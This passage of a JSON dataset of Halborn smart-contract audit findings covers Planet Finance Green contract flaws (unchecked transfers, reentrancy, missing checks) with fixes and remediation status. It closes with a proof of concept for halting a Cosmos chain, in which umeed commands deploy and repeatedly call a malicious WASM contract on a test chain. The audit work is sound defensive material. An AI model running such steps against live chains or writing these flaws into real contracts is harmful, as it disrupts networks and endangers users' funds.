17 18 19 20 } } [ Redacted for brevity ] Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use the latestRoundData function to retrieve an assets price instead. Checks on the return data should be introduced with proper revert messages if the price is stale or the round is incomplete. Remediation Plan: SOLVED: The Planet Finance team fixed this issue in the commit 9517d388979cbafd4830e300d52458f32ed54010 (Refer:UniswapAnchoredView.sol). As a result, now, code uses latestRoundData function to retrieve an assets price. 20 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contracts Reservoir and Gammatroller , the return values of the external transfer calls are not checked. It should be noted that token does not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Reservoir.sol Lines #396-398 Listing 3: Reservoir.sol (Lines 396,397,398) 396 397 398 token_ . transfer ( gammaTroller , deltaDripGammaTroller_ ); token_ . transfer ( foundation , deltaDripFoundation_ ); token_ . transfer ( treasury , deltaDripTreasury_ ); Reservoir.sol Lines #410 Listing 4: Reservoir.sol (Line 410) 406 407 408 409 410 411 412 413 414 function dripOnFarm ( uint _amount ) external onlyFarm { farmDripped += _amount ; token . transfer ( farmAddress , _amount ); emit FarmDripped ( farmDripped , block . timestamp ); } 21 Gammatroller.sol Lines #4590 Listing 5: Gammatroller.sol (Line 4590) 4586 function grantGammaInternal ( address user , uint amount ) 4587 4588 4589 4590 4591 4592 4593 4594 internal returns ( uint ) { Gamma gamma = Gamma ( getGammaAddress () ); uint gammaRemaining = gamma . balanceOf ( address ( this )) ; if ( amount > 0 && amount <= gammaRemaining ) { gamma . transfer ( user , amount ); return 0; } return amount ; } Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. It is recommended to check after transfer balance. Remediation Plan: SOLVED: The Planet Finance team fixed this issue in the commit 19beabb2bdf7e66857207135e5afac0717271118. As a result, now code using the SafeERC20 implementation and add the safetransfer function to the Reservoir.sol contract code. However, the team added that the team does not use the grantGammaInternal function in the gammatroller contract. 22 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Medium"
        ]
    },
    {
        "title": "COMPTROLLER ERC777 LEADS TO RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It is noted that forked comptroller contract Unitroller.sol uses ERC777 that have functions vulnerable to Re-enterancy Vulnerability. It should be noted that all compound forks are vulnerable, unless nonReentrant modifier is used. Exploitation Scenario: For the successful exploitation, the exploit requires the following con- ditions - The contract admin should add support for ERC777 Token. - The contract admin should set the bad token price through oracle. - The contract admin should set collateral factor in the comptroller. Exploitation Flow-Graph: 23 Code Location: Listing 6: Unitroller.sol (Line 1801) 1794 1795 1796 1797 1798 1799 1800 1801 1802 1803 1804 1805 1806 1807 1808 1809 1810 1811 1812 1813 1814 1815 1816 /* * We invoke doTransferOut for the borrower and the borrowAmount . Note : The gToken must handle variations between ERC -20 and ETH underlying . On success , the gToken borrowAmount less of cash . If doTransferOut fails despite the fact we checked pre - conditions , we revert because we can 't be sure if side effects occurred . * * * * */ vars . err = doTransferOut ( borrower , borrowAmount ); require ( vars . err == Error . NO_ERROR , \" borrow transfer out failed \" ); /* We write the previously calculated values into storage */ accountBorrows [ borrower ]. principal = vars . accountBorrowsNew ; accountBorrows [ borrower ]. interestIndex = borrowIndex ; totalBorrows = vars . totalBorrowsNew ; /* We emit a Borrow event */ emit Borrow ( borrower , borrowAmount , vars . accountBorrowsNew , vars . totalBorrowsNew ); /* We call the defense hook */ gammatroller . borrowVerify ( address ( this ) , borrower , borrowAmount ); return uint ( Error . NO_ERROR ); } Recommendation: It is recommended to implement the below controls - nonReentrant modifier should be implemented for borrowFresh(), redeemFresh(), doTransferIn() and doTransferOut() 24 - (bool, success) check should be controlled on the outside of the doTransferOut() functionality - function doTransferOut() intercepted variables Storage should before be Below is the fix to the vulnerable code. Listing 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /* We write the previously calculated values into storage */ accountBorrows [ borrower ]. principal = vars . accountBorrowsNew ; accountBorrows [ borrower ]. interestIndex = borrowIndex ; totalBorrows = vars . totalBorrowsNew ; /* * We invoke doTransferOut for the borrower and the borrowAmount . Note : The gToken must handle variations between ERC -20 and ETH underlying . On success , the gToken borrowAmount less of cash . If doTransferOut fails despite the fact we checked pre - conditions , we revert because we can 't be sure if side effects occurred . * * * * */ vars . err = doTransferOut ( borrower , borrowAmount ); require ( vars . err == Error . NO_ERROR , \" borrow transfer out failed \" ); /* We emit a Borrow event */ emit Borrow ( borrower , borrowAmount , vars . accountBorrowsNew , vars . totalBorrowsNew ); /* We call the defense hook */ gammatroller . borrowVerify ( address ( this ) , borrower , borrowAmount ); return uint ( Error . NO_ERROR ); } 25 Remediation Plan: RISK ACCEPTED: The Planet Finance team acknowledged this issue. The team confirmed that the deployed contracts are not implemented with ERC-777, and the ERC777 standard will not be used in the future. 26 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH NON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some tokens (like USDT) dont correctly implement the EIP20 standard and their transfer/transferFrom functions return void, instead of a suc- cess boolean. Calling these functions with the correct EIP20 function signatures will always revert. In the contract Gammatroller.sol, gAQUA_Delegate.sol, gAQUA_Delegator. sol gBNB.sol, gGAMMA_Delegate.sol, gGAMMA_Delegator.sol, gToken_Delegate .sol, gToken_Delegator.sol, Maximillion.sol, and Unitroller.sol their transfer or transferFrom does not return a boolean for ERC20 functions if implemented. A contract compiled with solidity version greater than 0.4.22 interacting with these functions will fail to execute them, as the return value is missing. Tokens that dont correctly implement the latest EIP20 spec, like USDT, will be unusable in the smart contract as they revert the transaction because of the missing return value. We recommend using OpenZeppelins SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens. Code Location: Following contracts transfer or transferFrom does not return a boolean. Listing 8 1 ( Gammatroller . sol #1379 -1441) : EIP20NonStandardInterface . transfer ( address , uint256 ) 2 ( Gammatroller . sol #1379 -1441) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 3 ( gAQUA_Delegate . sol #906 -968) : EIP20NonStandardInterface . transfer ( address , uint256 ) 4 ( gAQUA_Delegate . sol #906 -968) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 27 5 ( gAQUA_Delegator . sol #728 -790) : EIP20NonStandardInterface . transfer ( address , uint256 ) 6 ( gAQUA_Delegator . sol #728 -790) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 7 ( gBNB . sol #687 -749) : EIP20NonStandardInterface . transfer ( address , uint256 ) 8 ( gBNB . sol #687 -749) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 9 ( gGAMMA_Delegate . sol #766 -828) : EIP20NonStandardInterface . transfer ( address , uint256 ) 10 ( gGAMMA_Delegate . sol #766 -828) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 11 ( gGAMMA_Delegator . sol #14 -76) : EIP20NonStandardInterface . transfer ( address , uint256 ) 12 ( gGAMMA_Delegator . sol #14 -76) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 13 ( gToken_Delegate . sol #906 -968) : EIP20NonStandardInterface . transfer ( address , uint256 ) 14 ( gToken_Delegate . sol #906 -968) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 15 ( gToken_Delegator . sol #728 -790) : EIP20NonStandardInterface . transfer ( address , uint256 ) 16 ( gToken_Delegator . sol #728 -790) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 17 ( Maximillion . sol #672 -734) : EIP20NonStandardInterface . transfer ( address , uint256 ) 18 ( Maximillion . sol #672 -734) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 19 ( Unitroller . sol #670 -732) : EIP20NonStandardInterface . transfer ( address , uint256 ) 20 ( Unitroller . sol #670 -732) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to use SafeERC20: safeTransfer and safeTransferFrom. 28 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue, as the team confirmed that Planet Finance does not use any non-standard tokens in the protocol. 29 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In some functions discovered there is a for loop on variable i that iterates up to the gTokens.length, assets.length, usersWhoHaveBorrow .length, and usersWhoHaveSupply.length array length. If this integer is evaluated at large numbers, this can cause a DoS. Code Location: Listing 9: Gammatroller.sol (Line 4561) 4556 function claimGamma ( address [] memory holders , GToken [] memory 4557 4558 4559 4560 4561 4562 4563 4564 4565 4566 4567 4568 4569 4570 4571 4572 4573 4574 gTokens , bool borrowers , bool suppliers ) public { for ( uint i = 0; i < gTokens . length ; i ++) { GToken gToken = gTokens [i ]; require ( markets [ address ( gToken ) ]. isListed , \" market must be listed \" ); if ( borrowers == true ) { Exp memory borrowIndex = Exp ({ mantissa : gToken . borrowIndex () }) ; updateGammaBorrowIndex ( address ( gToken ) , borrowIndex ); for ( uint j = 0; j < holders . length ; j ++) { distributeBorrowerGamma ( address ( gToken ) , holders [j ], borrowIndex ); } } if ( suppliers == true ) { updateGammaSupplyIndex ( address ( gToken )) ; for ( uint j = 0; j < holders . length ; j ++) { distributeSupplierGamma ( address ( gToken ) , holders [j ]) ; } } } for ( uint j = 0; j < holders . length ; j ++) { 30 4575 4576 4577 } } gammaAccrued [ holders [j ]] = grantGammaInternal ( holders [ j ], gammaAccrued [ holders [ j ]]) ; Listing 10: Gammatroller.sol (Lines 4050,4058) 4035 4036 4037 4038 4039 4040 4041 4042 4043 4044 4045 4046 4047 4048 4049 4050 4051 4052 4053 4054 4055 4056 4057 4058 4059 4060 4061 4062 function getHypotheticalAccountLiquidityInternal ( address account , GToken gTokenModify , uint redeemTokens , uint borrowAmount ) internal view returns ( Error , uint , uint ) { AccountLiquidityLocalVars memory vars ; // Holds all our calculation results uint oErr ; // For each asset the account is in GToken [] memory assets = accountAssets [ account ]; for ( uint i = 0; i < assets . length ; i ++) { GToken asset = assets [ i ]; // Read the balances and exchange rate from the gToken ( oErr , vars . gTokenBalance , vars . borrowBalance , vars . exchangeRateMantissa ) = asset . getAccountSnapshot ( account ); if ( oErr != 0) { // semi - opaque error code , we assume NO_ERROR == 0 is invariant between upgrades return ( Error . SNAPSHOT_ERROR , 0, 0) ; } vars . collateralFactor = Exp ({ mantissa : markets [ address ( asset ) ]. collateralFactorMantissa }) ; vars . exchangeRate = Exp ({ mantissa : vars . exchangeRateMantissa }) ; // Get the normalized price of the asset vars . oraclePriceMantissa = oracle . getUnderlyingPrice ( asset ); if ( vars . oraclePriceMantissa == 0) { return ( Error . PRICE_ERROR , 0, 0) ; } vars . oraclePrice = Exp ({ mantissa : vars . oraclePriceMantissa }) ; 31 4063 4064 4065 4066 4067 4068 4069 4070 4071 4072 4073 4074 4075 4076 4077 4078 4079 4080 4081 4082 4083 4084 4085 4086 4087 4088 4089 4090 4091 // Pre - compute a conversion factor from tokens -> ether ( normalized price value ) vars . tokensToDenom = mul_ ( mul_ ( vars . collateralFactor , vars . exchangeRate ) , vars . oraclePrice ); // sumCollateral += tokensToDenom * gTokenBalance vars . sumCollateral = mul_ScalarTruncateAddUInt ( vars . tokensToDenom , vars . gTokenBalance , vars . sumCollateral ); // sumBorrowPlusEffects += oraclePrice * borrowBalance vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . oraclePrice , vars . borrowBalance , vars . sumBorrowPlusEffects ); // Calculate effects of interacting with gTokenModify if ( asset == gTokenModify ) { // redeem effect // sumBorrowPlusEffects += tokensToDenom * redeemTokens vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . tokensToDenom , redeemTokens , vars . sumBorrowPlusEffects ); // borrow effect // sumBorrowPlusEffects += oraclePrice * borrowAmount vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . oraclePrice , borrowAmount , vars . sumBorrowPlusEffects ); } } // These are safe , as the underflow condition is checked first if ( vars . sumCollateral > vars . sumBorrowPlusEffects ) { return ( Error . NO_ERROR , vars . sumCollateral - vars . sumBorrowPlusEffects , 0) ; } else { return ( Error . NO_ERROR , 0 , vars . sumBorrowPlusEffects - vars . sumCollateral ); } } 32 Listing 11: gBNB.sol (Lines 2660,2667) 2653 2654 2655 2656 2657 2658 2659 2660 2661 2662 2663 2664 2665 2666 2667 2668 2669 2670 2671 2672 2673 function updateDiscountForAll () external { address [] memory usersWhoHaveBorrow = PlanetDiscount ( discountLevel ). returnBorrowUserArr ( address ( this )) ; address [] memory usersWhoHaveSupply = PlanetDiscount ( discountLevel ). returnSupplyUserArr ( address ( this )) ; for ( uint i = 0 ; i < usersWhoHaveBorrow . length ; i ++) { ( bool exist , , , ,) = PlanetDiscount ( discountLevel ). borrowDiscountSnap ( address ( this ) , usersWhoHaveBorrow [ i ]) ; if ( usersWhoHaveBorrow [ i ] != address (0) && exist ){ changeUserBorrowDiscountInternal ( usersWhoHaveBorrow [ i ]) ; changeLastBorrowBalanceAtBorrow ( usersWhoHaveBorrow [i ]) ; } } for ( uint i = 0 ; i < usersWhoHaveSupply . length ; i ++) { ( bool exist , , ,) = PlanetDiscount ( discountLevel ). supplyDiscountSnap ( address ( this ) , usersWhoHaveSupply [ i ]) ; if ( usersWhoHaveSupply [ i ] != address (0) && exist ){ changeUserSupplyDiscountInternal ( usersWhoHaveSupply [ i ]) ; changeLastExchangeRateAtSupply ( usersWhoHaveSupply [ i ]) ; } } } Listing 12: Maximillion.sol (Lines 2625,2632) function updateDiscountForAll () external { address [] memory usersWhoHaveBorrow = PlanetDiscount ( discountLevel ). returnBorrowUserArr ( address ( this )) ; address [] memory usersWhoHaveSupply = PlanetDiscount ( discountLevel ). returnSupplyUserArr ( address ( this )) ; 2618 2619 2620 2621 2622 2623 33 2624 2625 2626 2627 2628 2629 2630 2631 2632 2633 2634 2635 2636 2637 2638 for ( uint i = 0 ; i < usersWhoHaveBorrow . length ; i ++) { ( bool exist , , , ,) = PlanetDiscount ( discountLevel ). borrowDiscountSnap ( address ( this ) , usersWhoHaveBorrow [ i ]) ; if ( usersWhoHaveBorrow [ i ] != address (0) && exist ){ changeUserBorrowDiscountInternal ( usersWhoHaveBorrow [ i ]) ; changeLastBorrowBalanceAtBorrow ( usersWhoHaveBorrow [i ]) ; } } for ( uint i = 0 ; i < usersWhoHaveSupply . length ; i ++) { ( bool exist , , ,) = PlanetDiscount ( discountLevel ). supplyDiscountSnap ( address ( this ) , usersWhoHaveSupply [ i ]) ; if ( usersWhoHaveSupply [ i ] != address (0) && exist ){ changeUserSupplyDiscountInternal ( usersWhoHaveSupply [ i ]) ; changeLastExchangeRateAtSupply ( usersWhoHaveSupply [ i ]) ; } } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to set the max length to which a for loop can iterate, and avoid usage of nested loops. If possible, use pull over push strategy for external calls. Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue, as the team confirmed that these functions have a finite amount of things 34 to loop through. 35 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. Code Location:  In contract Gammatroller.sol:  _setBorrowCapGuardian newBorrowCapGuardian. lacks a zero address check on  _setPauseGuardian lacks a zero address check on newPauseGuardian .  _setPendingAdmin lacks a zero address check on newPendingAdmin, newPendingAdmin.  _setPendingImplementation newPendingImplementation.  In contract gAQUA_Delegate.sol: lacks a zero address check on  initialize lacks a zero address check on underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gAQUA_Delegator.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract gBNB.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gGAMMA_Delegate.sol: 36  initialize lacks a zero address check on underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  _setWithdrawFeeAddress on newWithdrawFeeAddress.  In contract gGAMMA_Delegator.sol: address check lacks zero a  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract gToken_Delegate.sol:  initialize lacks a zero address check on underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gToken_Delegator.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract Maximillion.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract PlanetDiscountDelegate.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  In contract PlanetDiscountDelegator.sol:  constructor lacks a zero address check on admin_.  _setAdmin lacks a zero address check on newAdmin.  _setImplementation lacks a zero address check on implementation_ .  In contract Reservoir.sol:  changeFoundationAddress lacks a zero address check on _newFoundation.  changeTreasuryAddress lacks a zero address check on _newTreasury . 37  In contract Unitroller.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin, newPendingAdmin.  _setPendingImplementation newPendingImplementation. lacks a zero address check on Zero Address Validation missing before address assignment to these state variable. Listing 13: Gammatroller.sol 1 2 3 4 5 pendingGammatrollerImplementation = newPendingImplementation (#448) pendingAdmin = newPendingAdmin (#497) pendingAdmin = newPendingAdmin (#3004) borrowCapGuardian = newBorrowCapGuardian (#4304) pauseGuardian = newPauseGuardian (#4324) Listing 14: gAQUA_Delegate.sol 1 2 underlying = underlying_ (#2918) pendingAdmin = newPendingAdmin (#2560) Listing 15: gAQUA_Delegator.sol 1 2 3 4 5 gGammaAddress = _newgGammaAddress (#636) gammatroller = _newGammatroller (#637) oracle = _newOracle (#638) admin = admin_ (#1225) implementation = implementation_ (#1242) Listing 16: gBNB.sol 1 pendingAdmin = newPendingAdmin (#2269) Listing 17: gGAMMA_Delegate.sol 1 2 underlying = underlying_ (#2833) pendingAdmin = newPendingAdmin (#2434) 38 3 withdrawFeeAddress = newWithdrawFeeAddress (#2705) Listing 18: gGAMMA_Delegator.sol 1 2 admin = admin_ (#573) implementation = implementation_ (#590) Listing 19: gToken_Delegate.sol 1 2 underlying = underlying_ (#2919) pendingAdmin = newPendingAdmin (#2561) Listing 20: gToken_Delegator.sol 1 2 3 4 5 gGammaAddress = _newgGammaAddress (#636) gammatroller = _newGammatroller (#637) oracle = _newOracle (#638) admin = admin_ (#1225) implementation = implementation_ (#1242) Listing 21: Maximillion.sol 1 pendingAdmin = newPendingAdmin (#2240) Listing 22: PlanetDiscountDelegate.sol 1 2 3 gGammaAddress = _newgGammaAddress (#743) gammatroller = _newGammatroller (#744) oracle = _newOracle (#745) Listing 23: PlanetDiscountDelegator.sol 1 2 3 admin = admin_ (#14) implementation = implementation_ (#25) admin = newAdmin (#38) 39 Listing 24: Reservoir.sol 1 2 foundation = _newFoundation (#420) treasury = _newTreasury (#430) Listing 25: Unitroller.sol 1 2 3 pendingAdmin = newPendingAdmin (#2119) pendingGammatrollerImplementation = newPendingImplementation (#2499) pendingAdmin = newPendingAdmin (#2550) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Although administrative restrictions are imposed to this function due to the role-based access controls (RBAC), it is recommended to add proper address validation when assigning user supplied input to a variable. This could be as simple as using the following statement: Listing 26 1 require ( address_input != 0 , \" Address is zero \" ) Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 40 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ABIEncoderV2 is enabled to be able to pass struct type into a function, both web3 and another contract. The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to The types a local variable. bytesNN and bool will result in corrupted data, while enum might lead to an invalid revert. Using return does not trigger the bug. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly, even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically sized arrays are always encoded after statically sized arrays with statically sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, the code is NOT affected: All the structs or arrays only use uint256 or int256 types. 41 If only using integer types (that may be shorter) and only encode at most one array at a time. If only returning such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to be able to pass struct type into a function, both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Code Location: Listing 27 1 Gammatroller . sol #8: pragma experimental ABIEncoderV2 ; 2 UniswapConfig . sol #4: pragma experimental ABIEncoderV2 ; 3 GAMMA . sol #6: pragma experimental ABIEncoderV2 ; 4 UniswapAnchoredView . sol #4: pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e., all using uint256). Reference: Solidity Optimizer and ABIEncoderV2 Bug 42 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 43 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION DEPRECATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Green contracts, the current pragma version in use for the con- tracts is pragma 0.5.16, 0.5.17, and 0.5.8. While this version is still functional, and some security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 28 1 BNB_INTEREST_RATE_MODEL . sol : pragma solidity ^0.5.16; 2 GAMMA . sol : pragma solidity ^0.5.16; 3 Gammatroller . sol : pragma solidity ^0.5.16; 4 Maximillion . sol : pragma solidity ^0.5.8; 5 Maximillion . sol : pragma solidity ^0.5.16; 6 PlanetDiscountDelegate . sol : pragma solidity ^0.5.16; 7 PlanetDiscountDelegator . sol : pragma solidity ^0.5.16; 8 PlanetDiscountStorage . sol : pragma solidity ^0.5.17; 9 Reservoir . sol : pragma solidity ^0.5.17; 10 Unitroller . sol : pragma solidity ^0.5.8; 11 gAQUA_Delegate . sol : pragma solidity ^0.5.16; 12 gAQUA_Delegator . sol : pragma solidity ^0.5.16; 13 gBNB . sol : pragma solidity ^0.5.8; 14 gGAMMA_Delegate . sol : pragma solidity ^0.5.16; 15 gGAMMA_Delegator . sol : pragma solidity ^0.5.16; 16 gToken_Delegate . sol : pragma solidity ^0.5.16; 17 gToken_Delegator . sol : pragma solidity ^0.5.16; 18 interestRateModel . sol : pragma solidity ^0.5.16; Risk Level: Likelihood - 2 Impact - 2 44 Recommendation: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.9. For example, after the Solidity version 0.8.0 arithmetic operations revert to underflow and overflow by default, by using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 45 ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE PRAGMA DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Planet Finance contracts use different pragma versions. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma ver- sion that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. The latest pragma version (0.8.9) was released in September 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 8 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file with all bugs It should be noted that finding in the different compiler versions. pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Recommendation: Consider locking and using a single pragma version without known bugs for the compiler version. If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.0 - 0.8.9. For example, after the Solidity version 0.8.0 arithmetic operations revert to underflow and overflow by default, by using this version, utility contracts like SafeMath.sol would not be needed. 46 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 47 3.10 (HAL-10) FLOATING PRAGMA - LOW ",
        "labels": [
            "Halborn",
            "Planet_Finance_Green",
            "Severity: Informational"
        ]
    },
    {
        "title": "VULNERABLE WASM SMART CONTRACT LEADS TO CHAIN HALT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A vulnerability in the WASM integration and the authz module in the cosmos -sdk has been detected, and was recently exploited to halt another chain (JUNO). In the vulnerability, A smart contract abused non-deterministic state in authz grants to save a different hash to all validators. Juno Halt Root Cause Steps:  An attacker is deployed a malicious contract on the Juno.  A malicious contract is located on the Mint Scan.  During the review of malicious contract, It has been observed that an attackers contract is calling Authz Module MsgGrant and MsgRevoke. 15  The smart contract leads to a non-determinism in Authzs MsgGrant where the grant expiration was suspected to default to the nodes OS time if unset by the message sender.  The reply() feature of CosmWasm allows calling a message and get- With a couple of messages, a non- ting back its output events. deterministic event ordering occurred in the Authz module, which causes chain halt. Proof Of Concept: A summary of the steps:  Deploy malicious contract to UMEE.  Execute MsgExecuteContract in a loop.  The chain will be halted. Listing 1: Deploy malicious WASM contract proposal into the UMEE with this command 1 echo y | umeed tx gov submit - proposal wasm - store malicious . wasm --  title \" JUNO POC \" -- run - as $( umeed keys show user1 -- keyring - 16 1 >/ dev / null 2 >/ dev / null  backend = test -a ) -- chain - id testhub -- description \" JUNO POC \" --  from user1 -- keyring - backend test -- gas 100000000 -b block 1 >/ dev /  null 2 >/ dev / null 2 3 echo y | umeed tx gov deposit 1 100000000 uumee -- from user1 --  keyring - backend test -- chain - id testhub -y -b block -- gas 7000000  -- gas - prices 0.025 uumee 4 echo y | umeed tx gov vote 1 yes -- from user1 -- keyring - backend test  -- chain - id testhub -y -b block -- gas 400000 -- gas - prices 0.025  uumee 5 6 echo y | umeed tx gov deposit 1 100000000 uumee -- from user2 --  keyring - backend test -- chain - id testhub -y -b block -- gas 7000000  -- gas - prices 0.025 uumee 7 echo y | umeed tx gov vote 1 yes -- from user2 -- keyring - backend test  -- chain - id testhub -y -b block -- gas 400000 -- gas - prices 0.025  uumee 1 >/ dev / null 2 >/ dev / null 1 >/ dev / null 2 >/ dev / null 1 >/ dev / null 2 >/ dev / null Listing 2: Instantiate contract with this parameter. 1 INIT =\" {\\ \" admin \\ \": \\\" address \\ \" }\" 2 echo y | umeed tx wasm instantiate 1 \" $INIT \" -- admin $( umeed keys  show user1 -- keyring - backend = test -a) -- from user1 -- keyring -  backend test -- amount = \" 100 uumee \" -- label \" juno - poc \" -- gas 1000000  -y -- chain - id testhub -b block Listing 3: Call MsgExecuteContract with this command in a for loop. An attacker sent 150 Messages through contract 1 MESSAGE = \" {\\ \" custom_msg1 \\\" : {\\ \" grantee \\\" : \\ \" $( umeed keys show user1  -- keyring - backend = test -a )\\ \" }} \" 2 umeed tx wasm execute $CONTRACT_ADDR \" $MESSAGE \"  keyring - backend test -- chain - id testhub -y -b block -- gas  100000000 -- from user1 -- Chain will be halted due to non-deterministic state. Code Location: Location 17 Listing 4 1 2 3 4 5 6 7 8 9 10 